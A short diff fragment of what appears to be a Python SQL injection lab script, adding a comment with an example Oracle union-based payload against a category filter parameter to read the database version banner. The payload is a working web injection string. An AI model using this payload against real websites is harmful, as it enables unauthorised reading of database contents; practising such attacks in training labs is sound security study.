@@ -22,6 +22,7 @@ def exploit_sqli_version(url):
         print(f'[+] The database version is: {version}')
         return True
 
+#example of payload for oracle = /filter?category=Pets'+union+select+null,banner+from+v$version--
 
 
 if __name__ == '__main__':
